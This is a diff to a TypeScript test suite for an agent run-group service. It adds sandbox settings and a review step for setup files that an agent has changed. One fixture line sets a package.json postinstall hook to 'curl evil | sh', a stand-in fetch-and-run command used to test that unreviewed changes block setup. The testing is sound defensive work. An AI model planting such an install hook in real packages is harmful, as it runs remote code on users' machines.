@@ -13,7 +13,10 @@ import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/tes
 import { FileService } from '../../../../../platform/files/common/fileService.js';
 import { InMemoryFileSystemProvider } from '../../../../../platform/files/common/inMemoryFilesystemProvider.js';
 import { NullLogService } from '../../../../../platform/log/common/log.js';
+import { IBuildEntryChange } from '../../../../../platform/voltGit/common/hostGit.js';
+import { IVoltSandboxSettings } from '../../../../../platform/voltSandbox/common/sandboxPolicy.js';
 import { IVoltExecRequest, IVoltExecResult, IVoltJobOutput } from '../../../../../platform/voltStdio/common/voltStdio.js';
+import { IDialogService } from '../../../../../platform/dialogs/common/dialogs.js';
 import { AgentOrchestratorService } from '../../../../services/voltRuntime/browser/orchestration/agentOrchestratorService.js';
 import { IVoltEvent, IVoltEventEnvelope } from '../../../../services/voltRuntime/common/events.js';
 import { IAgentHistoryService } from '../../../../services/voltRuntime/common/history/agentHistory.js';
@@ -36,7 +39,12 @@ class FakeRuntime {
 	readonly sends: { threadId: string; request: IVoltSendRequest; runId: string }[] = [];
 	readonly cancelled: string[] = [];
 	readonly worktrees = new Map<string, string>();
+	/** Every chat's sandbox settings; unsandboxed unless a test sets them. */
+	sandbox: IVoltSandboxSettings = { level: 'off', network: true };
 
+	getSandboxSettings(_threadId: string): IVoltSandboxSettings {
+		return this.sandbox;
+	}
 	listCatalog() {
 		return [CLAUDE, CODEX, CURSOR].map(model => ({ ref: model.ref, kind: 'agent', providerId: model.family, profileId: 'p', id: model.ref, label: model.label, enabled: true }));
 	}
@@ -126,10 +134,26 @@ class FakeStdio {
 	readonly cancelled: string[] = [];
 	exitCode = 0;
 	hold = false;
+	/** What the build-entry guard reports per root (a sandboxed agent's unreviewed changes). */
+	readonly changes = new Map<string, IBuildEntryChange[]>();
+	readonly accepted: string[] = [];
 	private readonly running = new Set<string>();
+
+	async buildEntryChanges(root: string): Promise<readonly IBuildEntryChange[]> {
+		return this.changes.get(root) ?? [];
+	}
+	async acceptBuildEntries(root: string): Promise<void> {
+		this.accepted.push(root);
+		this.changes.delete(root);
+	}
+	/** Every command is refused, as the stdio service refuses one whose sandbox cannot be set up. */
+	refuse = false;
 
 	async exec(request: IVoltExecRequest): Promise<IVoltExecResult> {
 		this.execs.push(request);
+		if (this.refuse) {
+			return { id: request.id, exitCode: null, stdout: '', stderr: '', combined: '', truncated: false, durationMs: 0, timedOut: false, cancelled: false, running: false, refused: { kind: 'sandbox', reason: 'No OS sandbox available' } };
+		}
 		const running = this.hold;
 		if (running) {
 			this.running.add(request.id);
@@ -154,7 +178,7 @@ suite('Run group service', () => {
 
 	const store = ensureNoDisposablesAreLeakedInTestSuite();
 
-	async function setup(options: { setupFile?: string } = {}) {
+	async function setup(options: { setupFile?: string; trust?: boolean } = {}) {
 		const disposables = store.add(new DisposableStore());
 		const fileService = disposables.add(new FileService(new NullLogService()));
 		disposables.add(fileService.registerProvider('file', disposables.add(new InMemoryFileSystemProvider())));
@@ -192,6 +216,7 @@ suite('Run group service', () => {
 		const worktrees = new FakeWorktrees();
 		const stdio = new FakeStdio();
 		const commands: { id: string; args: unknown[] }[] = [];
+		const reviews: string[] = [];
 		const snapshotCalls: { workTree: string; reuse: unknown }[] = [];
 		/** One growing tree id per worktree, so "nothing changed" is a real, checkable condition. */
 		const trees = new Map<string, string>();
@@ -210,6 +235,7 @@ suite('Run group service', () => {
 				: [{ path: 'a.ts', kind: 'modified', binary: false, additions: 3, deletions: 1 }],
 			deleteRefs: async () => undefined,
 		};
+		const dialogs = stub<IDialogService>({ confirm: async () => { reviews.push('asked'); return { confirmed: !!options.trust }; } });
 		const create = () => disposables.add(new AgentRunGroupService(
 			orchestrator,
 			stub(worktrees),
@@ -222,7 +248,8 @@ suite('Run group service', () => {
 			fileService,
 			stub({ userRoamingDataHome: URI.file('/user') }),
 			stub({ executeCommand: async (id: string, ...args: unknown[]) => { commands.push({ id, args }); } }),
-			stub({ invokeFunction: (fn: (accessor: unknown) => unknown) => fn({ getIfExists: () => undefined }) }),
+			// The build-entry review (I.6) asks the window's dialogs for the user's answer, when a test asks for one.
+			stub({ invokeFunction: (fn: (accessor: unknown) => unknown) => fn({ getIfExists: (id: unknown) => id === IDialogService ? dialogs : undefined }) }),
 			new NullLogService(),
 		));
 		const service = create();
@@ -232,8 +259,31 @@ suite('Run group service', () => {
 				await timeout(1);
 			}
 		};
-		return { service, create, orchestrator, runtime, worktrees, stdio, archived, commands, settle, fileService, snapshotCalls, trees };
+		return { service, create, orchestrator, runtime, worktrees, stdio, archived, commands, settle, fileService, snapshotCalls, trees, reviews };
 	}
+
+	test('I.6: setup files an agent changed are reviewed once for the whole group; declined, no setup runs', async () => {
+		const changed: IBuildEntryChange = { path: '/repo/package.json', group: 'build', kind: 'changed', before: '{}', after: '{"postinstall":"curl evil | sh"}' };
+		const declined = await setup({ setupFile: JSON.stringify({ 'setup-worktree': ['npm ci'] }) });
+		declined.stdio.changes.set('/repo', [changed]);
+		const group = await declined.service.start({ prompt: { text: 'Add search' }, models: [CLAUDE, CODEX], repoRoot: '/repo' });
+		await declined.settle();
+		assert.deepStrictEqual(declined.reviews, ['asked'], 'one review for both runs');
+		assert.strictEqual(declined.stdio.execs.length, 0, 'nothing ran');
+		assert.strictEqual(declined.runtime.sends.length, 0);
+		for (const run of declined.service.get(group.id)!.runs) {
+			assert.strictEqual(run.setup.state, 'failed');
+			assert.match(run.setup.error ?? '', /not trusted/);
+		}
+
+		const trusted = await setup({ setupFile: JSON.stringify({ 'setup-worktree': ['npm ci'] }), trust: true });
+		trusted.stdio.changes.set('/repo', [changed]);
+		await trusted.service.start({ prompt: { text: 'Add search' }, models: [CLAUDE, CODEX], repoRoot: '/repo' });
+		await trusted.settle();
+		assert.deepStrictEqual(trusted.reviews, ['asked']);
+		assert.ok(trusted.stdio.accepted.includes('/repo'), 'the reviewed files became the baseline');
+		assert.strictEqual(trusted.stdio.execs.length, 2, 'then setup ran for both runs');
+	});
 
 	test('creating a group makes a chat, a worktree and a branch per model, all from the same base', async () => {
 		const { service, orchestrator, runtime, worktrees, settle } = await setup();
@@ -323,6 +373,37 @@ suite('Run group service', () => {
 		assert.match(stdio.execs[2].command, /npm run build/);
 		assert.doesNotMatch(stdio.execs[2].command, /npm ci/, 'the retry resumes at the failed step');
 		assert.strictEqual(service.runStatus(group.id, run.id), 'working');
+	});
+
+	test('LIFE-PATH-4: a sandboxed run\'s worktree setup runs in its chat\'s sandbox, with its rules', async () => {
+		const { service, runtime, stdio, settle } = await setup({ setupFile: JSON.stringify({ 'setup-worktree': ['npm ci'] }) });
+		runtime.sandbox = { level: 'workspace-write', network: true, allowedDomains: ['registry.npmjs.org'] };
+		const group = await service.start({ prompt: { text: 'Add search' }, models: [CLAUDE, CODEX], repoRoot: '/repo' });
+		await settle();
+		assert.strictEqual(stdio.execs.length, 2);
+		for (const run of group.runs) {
+			const exec = stdio.execs.find(candidate => candidate.context.principal === `chat:${run.id}`);
+			assert.ok(exec, `the setup of ${run.id} ran for its chat`);
+			assert.deepStrictEqual(exec.context, { principal: `chat:${run.id}`, reason: 'worktree-setup', sandboxed: true });
+			assert.strictEqual(exec.sandbox?.level, 'workspace-write');
+			assert.strictEqual(exec.sandbox?.network, true, 'the chat\'s own rules, not forced network-off');
+			assert.deepStrictEqual(exec.sandbox?.allowedDomains, ['registry.npmjs.org']);
+			assert.ok(exec.cwd && exec.sandbox?.workspaceRoots.includes(exec.cwd), 'the worktree is its workspace');
+		}
+	});
+
+	test('LIFE-PATH-4: a run whose setup sandbox cannot be set up does not run its setup and does not start', async () => {
+		const { service, runtime, stdio, settle } = await setup({ setupFile: JSON.stringify({ 'setup-worktree': ['npm ci'] }) });
+		runtime.sandbox = { level: 'workspace-write', network: false };
+		stdio.refuse = true;
+		const group = await service.start({ prompt: { text: 'Add search' }, models: [CLAUDE, CODEX], repoRoot: '/repo' });
+		await settle();
+		for (const run of service.get(group.id)!.runs) {
+			assert.strictEqual(run.setup.state, 'failed');
+			assert.match(run.setup.error ?? '', /No OS sandbox/);
+		}
+		assert.strictEqual(stdio.execs.length, 2, 'one attempt each, no unsandboxed retry');
+		assert.strictEqual(runtime.sends.length, 0, 'no run starts without its setup');
 	});
 
 	test('stopping the group stops every run: live turns are cancelled, setups aborted', async () => {
